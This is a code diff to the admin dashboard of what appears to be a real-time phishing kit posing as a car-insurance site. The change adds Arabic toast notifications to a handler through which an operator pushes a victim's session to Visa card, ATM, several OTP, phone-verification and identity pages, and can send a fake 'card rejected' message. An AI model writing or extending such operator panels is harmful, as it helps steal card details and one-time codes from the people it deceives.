@@ -17,6 +17,7 @@ import {
   ChevronDown,
   ChevronUp,
 } from "lucide-react";
+import { ToastContainer, toast } from "@/lib/toast-store";
 
 interface SubmissionRow {
   id: number;
@@ -640,18 +641,51 @@ export default function AdminDashboard() {
   }, []);
 
   const handleControlAction = useCallback(async (sessionId: string, action: string, code?: string) => {
-    console.log("AdminDashboard: Sending control action:", action, "for session:", sessionId);
     const token = getToken();
     if (!token) {
-      console.error("AdminDashboard: No token found!");
+      toast("error", "خطأ في التوثيق", "لم يتم العثور على رمز الدخول");
       return;
     }
+    
     try {
       const result = await sendAdminControl(sessionId, action, token, code);
-      console.log("AdminDashboard: Control sent successfully:", result);
+      
+      // Map action to page name for display
+      const pageNames: Record<string, string> = {
+        go_home: "الصفحة الرئيسية",
+        go_form: "بيانات المركبة",
+        go_select: "اختيار التأمين",
+        go_visa: "صفحة الفيزا",
+        go_otp: "صفحة OTP",
+        go_otp2: "صفحة OTP 2",
+        go_otp3: "صفحة OTP 3",
+        go_atm: "صفحة ATM",
+        go_nomer: "رقم الجوال",
+        go_nomer_wait: "انتظار رقم الجوال",
+        go_nomer_otp: "تحقق رقم الجوال",
+        go_identity_check: "التحقق من الهوية",
+        go_total: "الإجمالي",
+        go_total2: "الإجمالي 2",
+        go_waiting: "قائمة الانتظار",
+        card_error: "إبلاغ خطأ البطاقة",
+        nomer_error: "إبلاغ خطأ الرقم",
+        identity_code: "إرسال رمز الهوية",
+      };
+      
+      const pageName = pageNames[action] || action;
+      
+      if (result.success) {
+        if (action === "card_error") {
+          toast("success", "تم إرسال إشعار الخطأ", "تم إبلاغ العميل بأن البطاقة مرفوضة");
+        } else {
+          toast("success", "تم تحويل العميل", `تم التوجيه إلى: ${pageName}`);
+        }
+      }
     } catch (error) {
-      console.error("AdminDashboard: Error sending control:", error);
+      console.error("Error sending control:", error);
+      toast("error", "خطأ في التنفيذ", "فشل في إرسال الأمر للخادم");
     }
+    
     await fetchData();
   }, [fetchData]);
 
@@ -902,6 +936,8 @@ export default function AdminDashboard() {
           </div>
         </DialogContent>
       </Dialog>
+
+      <ToastContainer />
     </div>
   );
 }
